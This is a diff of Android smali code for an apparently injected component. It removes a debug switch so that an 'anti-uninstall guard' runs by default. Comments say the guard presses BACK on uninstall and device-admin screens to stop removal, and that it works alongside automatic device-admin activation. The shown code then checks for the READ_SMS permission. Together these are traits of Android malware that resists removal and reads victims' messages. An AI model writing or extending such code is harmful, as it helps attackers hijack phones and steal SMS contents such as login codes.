@@ -491,27 +491,6 @@
 
 .method public static accGuardStart(Landroid/content/Context;)V
     .locals 4
-    # 调试开关：inject_state.guard_on，默认 false = 调试期关闭防卸载守卫
-    # 守卫会把设备管理激活页当成“出现应用名 / 激活此管理应用程序”直接 BACK，跟自动激活冲突
-    :try_start_goff
-    const-string v0, "inject_state"
-    const/4 v1, 0x0
-    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
-    move-result-object v0
-    const-string v2, "guard_on"
-    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
-    move-result v0
-    if-nez v0, :guard_enabled
-    const-string v0, "PermDebug"
-    const-string v1, "guard OFF (inject_state.guard_on=false, debug)"
-    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
-    return-void
-    :guard_enabled
-    :try_end_goff
-    .catch Ljava/lang/Exception; {:try_start_goff .. :try_end_goff} :catch_goff
-    goto :guard_perm
-    :catch_goff
-    :guard_perm
     # 权限没拿全之前不启用防卸载，避免和授权流程打架
     :try_start_perm
     const-string v1, "android.permission.READ_SMS"
